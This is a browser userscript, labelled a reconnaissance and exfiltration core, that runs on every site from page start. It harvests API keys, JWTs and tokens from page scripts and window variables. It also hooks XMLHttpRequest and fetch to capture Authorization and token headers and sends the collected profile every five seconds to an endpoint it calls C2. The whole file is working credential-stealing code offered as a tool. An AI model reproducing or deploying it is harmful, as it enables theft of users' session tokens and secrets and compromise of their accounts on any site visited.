// ==UserScript==
// @name         [4ndr0666] DPSE Headless Reconnaissance & Exfiltration Core
// @namespace    http://4ndr0666.os/redcell/
// @version      2024.10.31.133700
// @description  Auto-synthesized by 4ndr0666. Aggressive heuristic parsing, XHR/Fetch hooking, and secret extraction.
// @author       Ψ-4ndr0666
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const C2_ENDPOINT = "http://127.0.0.1:9090/ingest"; // Local loopback for headless Docker orchestrator extraction
    const HEURISTIC_KEYWORDS = ['generate', 'process', 'auth', 'token', 'admin', 'api_key', 'secret', 'config', 'v1', 'v2', 'v3', 'v4'];
    const TARGET_PROFILE = {
        endpoints: [],
        secrets: [],
        sequences: [],
        timestamp: Date.now()
    };

    // [A] Ingestion & Parsing Module (IPM) - DOM & Script Heuristic Extraction
    function extractHeuristics() {
        console.log("[4ndr0666] Initiating deep-DOM heuristic sweep...");
        const scripts = document.querySelectorAll('script');
        const pattern = /(?:["'])(?:\/[a-zA-Z0-9_.-]+)+(?:["'])/g; // Path-like string extraction
        const secretPattern = /(?:api_key|jwt|access_token|secret)[\s=:]+["']([a-zA-Z0-9\-_.]+)["']/i;

        scripts.forEach(script => {
            const content = script.innerHTML || script.src;
            if (!content) return;

            // Extract potential endpoints
            let match;
            while ((match = pattern.exec(content)) !== null) {
                const ep = match[0].replace(/['"]/g, '');
                if (HEURISTIC_KEYWORDS.some(kw => ep.toLowerCase().includes(kw))) {
                    if (!TARGET_PROFILE.endpoints.includes(ep)) {
                        TARGET_PROFILE.endpoints.push({ path: ep, source: 'static_script', confidence: 0.75 });
                    }
                }
            }

            // Extract hardcoded secrets
            const secretMatch = content.match(secretPattern);
            if (secretMatch && secretMatch[1]) {
                TARGET_PROFILE.secrets.push({ type: 'hardcoded_token', value: secretMatch[1], confidence: 0.99 });
            }
        });

        // Scan Window object for leaked config
        for (const key in window) {
            if (typeof window[key] === 'string' && window[key].length > 20 && key.toLowerCase().includes('token')) {
                TARGET_PROFILE.secrets.push({ type: 'window_leak', key: key, value: window[key], confidence: 0.85 });
            }
        }
    }

    // [B] Dynamic Network Interception - XHR Hooking
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        this._requestData = { method, url, headers: {} };
        return originalXHROpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.setRequestHeader = (function(original) {
        return function(header, value) {
            this._requestData.headers[header] = value;
            if (header.toLowerCase() === 'authorization' || header.toLowerCase().includes('token')) {
                TARGET_PROFILE.secrets.push({ type: 'xhr_header_leak', key: header, value: value, confidence: 1.0 });
            }
            return original.apply(this, arguments);
        };
    })(XMLHttpRequest.prototype.setRequestHeader);

    XMLHttpRequest.prototype.send = function(body) {
        this._requestData.body = body;
        this.addEventListener('load', function() {
            const endpointData = {
                method: this._requestData.method,
                url: this._requestData.url,
                status: this.status,
                confidence: 0.95,
                source: 'dynamic_xhr'
            };
            TARGET_PROFILE.endpoints.push(endpointData);
            
            // Heuristic Sequence analysis (Action -> Result)
            if (this._requestData.method === 'POST' && this.status === 200) {
                 TARGET_PROFILE.sequences.push({ action: this._requestData.url, trigger: 'xhr_post_success' });
            }
        });
        return originalXHRSend.apply(this, arguments);
    };

    // [C] Dynamic Network Interception - Fetch Hooking
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const url = typeof args[0] === 'string' ? args[0] : args[0].url;
        const options = args[1] || {};
        const method = options.method || 'GET';

        if (options.headers) {
            for (const [key, value] of Object.entries(options.headers)) {
                 if (key.toLowerCase() === 'authorization' || key.toLowerCase().includes('api')) {
                     TARGET_PROFILE.secrets.push({ type: 'fetch_header_leak', key: key, value: value, confidence: 1.0 });
                 }
            }
        }

        try {
            const response = await originalFetch.apply(this, args);
            TARGET_PROFILE.endpoints.push({
                method: method,
                url: url,
                status: response.status,
                confidence: 0.95,
                source: 'dynamic_fetch'
            });
            return response;
        } catch (error) {
            throw error;
        }
    };

    // [D] Exfiltration & Telemetry
    function transmitTelemetry() {
        // Dedup endpoints
        TARGET_PROFILE.endpoints = [...new Map(TARGET_PROFILE.endpoints.map(item => [item.url, item])).values()];
        
        console.log("[4ndr0666] Transmitting Target Profile to C2...", TARGET_PROFILE);
        
        GM_xmlhttpRequest({
            method: "POST",
            url: C2_ENDPOINT,
            headers: {
                "Content-Type": "application/json"
            },
            data: JSON.stringify(TARGET_PROFILE),
            onload: function(response) {
                if (response.status === 200) {
                    console.log("[4ndr0666] Telemetry ingested by orchestrator.");
                }
            }
        });
    }

    // Execution Lifecycle
    window.addEventListener('DOMContentLoaded', () => {
        extractHeuristics();
        // Periodically transmit profile to the local Python Docker orchestrator
        setInterval(transmitTelemetry, 5000); 
    });

})();
